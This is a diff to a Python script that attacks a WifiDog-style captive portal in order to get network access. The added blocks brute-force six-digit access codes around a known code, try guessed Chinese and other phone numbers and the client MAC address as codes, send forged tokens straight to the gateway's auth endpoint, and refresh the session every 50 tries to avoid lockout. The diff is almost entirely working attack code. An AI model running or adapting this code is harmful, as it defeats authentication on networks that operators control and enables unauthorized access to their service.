@@ -271,6 +271,96 @@ def main():
                     log.info("Gateway accepted token!")
                     return keepalive(sess, gw_addr, gw_port, t)
 
+            # 9 - Try with phoneNumber param on gateway
+            log.info("[9] Gateway with phoneNumber...")
+            for num in ["655412","123456","100000","13800138000","0912345678","09123456789"]:
+                url = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}&phoneNumber={num}"
+                try:
+                    r = sess.get(url, timeout=5, allow_redirects=False)
+                    if "denied" not in r.headers.get("Location","") and check_online(sess):
+                        log.info(f"Gateway accepted with phone={num}!")
+                        return keepalive(sess, gw_addr, gw_port, sid)
+                except: pass
+
+            # 10 - More codes (phone number patterns)
+            log.info("[10] More phone-style codes...")
+            phone_codes = []
+            for prefix in ["13","15","17","18","19"]:
+                for suffix in ["000000","123456","888888","666666"]:
+                    phone_codes.append(prefix + suffix)
+            phone_codes.extend([f"09{x:08d}" for x in range(10000000,10000000+20)])
+            phone_codes.extend([f"13800{x:05d}" for x in range(100000,100000+20)])
+            for code in phone_codes[:50]:
+                ok, data = try_auth(sess, api_url, {"accessCode":code,"sessionId":sid,"apiVersion":1})
+                if ok:
+                    log.info(f"FOUND phone code={code}")
+                    return go(sess, data, gw_addr, gw_port, sid)
+
+            # 11 - SaveInternal then try gateway
+            log.info("[11] saveInternal + gateway...")
+            try:
+                r = sess.post(f"{host}/api/auth/saveInternal", json={
+                    "internalIp": params.get("ip",[""])[0],
+                    "internalPort": "2060", "sessionId": sid
+                }, timeout=5)
+                if ping_ok(sess, gw_addr, gw_port, sid) and check_online(sess):
+                    log.info("saveInternal + gateway worked!")
+                    return keepalive(sess, gw_addr, gw_port, sid)
+            except: pass
+
+            # A - Try MAC as access code
+            log.info("[A] MAC as code...")
+            for mac in [params.get("mac",[""])[0].replace(":","").replace("-","").lower(),
+                        params.get("mac",[""])[0].replace(":","").replace("-","").upper()]:
+                if mac:
+                    ok, data = try_auth(sess, api_url, {"accessCode":mac,"sessionId":sid,"apiVersion":1})
+                    if ok:
+                        log.info(f"FOUND MAC code={mac}")
+                        return go(sess, data, gw_addr, gw_port, sid)
+
+            # B - Random phone numbers
+            log.info("[B] Random phone codes...")
+            for num in ["13800138000","13900139000","15000150000","18600186000",
+                        "13500000001","13600000001","13700000001","13800000001",
+                        "15800000001","15900000001","18800000001","18900000001",
+                        "13000000001","13100000001","13200000001",
+                        "+8613800138000","+8613900139000","008613800138000"]:
+                ok, data = try_auth(sess, api_url, {"accessCode":num,"sessionId":sid,"apiVersion":1})
+                if ok:
+                    log.info(f"FOUND phone code={num}")
+                    return go(sess, data, gw_addr, gw_port, sid)
+
+            # C - POST to gateway directly
+            log.info("[C] POST to gateway...")
+            for token_val in [sid, chap_md5]:
+                try:
+                    r = sess.post(f"http://{gw_addr}:{gw_port}/wifidog/auth",
+                                  data={"token": token_val, "phoneNumber": "655412"},
+                                  timeout=5, allow_redirects=False)
+                    if "denied" not in r.headers.get("Location","") and check_online(sess):
+                        log.info("POST to gateway worked!")
+                        return keepalive(sess, gw_addr, gw_port, token_val)
+                except: pass
+
+            # 12 - Brute-force near known code 655412
+            log.info("[12] Brute near 655412 (400 codes)...")
+            base = 655412
+            for offset in range(-200, 201):
+                code = str(base + offset)
+                if len(code) != 6: continue
+                ok, data = try_auth(sess, api_url, {"accessCode":code,"sessionId":sid,"apiVersion":1})
+                if ok:
+                    log.info(f"FOUND code={code}")
+                    return go(sess, data, gw_addr, gw_port, sid)
+                if offset % 50 == 0:
+                    # Refresh session
+                    s2 = requests.Session()
+                    s2.headers = sess.headers
+                    s2.verify = False
+                    sid2, h2, p2 = get_session(s2)
+                    if sid2:
+                        sess = s2; sid = sid2; host = h2; params = p2
+
             log.warning("All failed, retrying...")
             sess.close(); time.sleep(5)
             sess = requests.Session()
